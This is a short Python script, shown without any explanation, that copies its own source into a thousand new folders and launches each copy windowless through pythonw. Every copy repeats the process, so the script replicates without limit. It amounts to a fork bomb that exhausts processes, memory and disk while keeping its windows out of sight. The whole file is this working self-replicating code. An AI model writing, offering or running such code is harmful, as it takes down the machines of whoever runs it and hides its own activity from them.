import os
import subprocess
import time

CLONES_PER_LEVEL = 1000 

def get_level_and_id():
    try:
        folder = os.path.basename(os.path.dirname(os.path.abspath(__file__)))
        level, cid = map(int, folder.split('_'))
        return level, cid
    except:
        return 0, 0

def replicate():
    level, cid = get_level_and_id()
    next_level = level + 1

    for i in range(1, CLONES_PER_LEVEL + 1):
        new_folder = f"{next_level}_{i}"
        new_file = f"{next_level}_{i}.pyw"
        os.makedirs(new_folder, exist_ok=True)
        path = os.path.join(new_folder, new_file)

        with open(__file__, 'r') as f:
            code = f.read()

        with open(path, 'w') as f:
            f.write(code)

        print(f"[{level}_{cid}] → Created and launching {path}")
        subprocess.Popen(["pythonw", new_file], cwd=new_folder)

        time.sleep(0.2) 

if __name__ == "__main__":
    replicate()
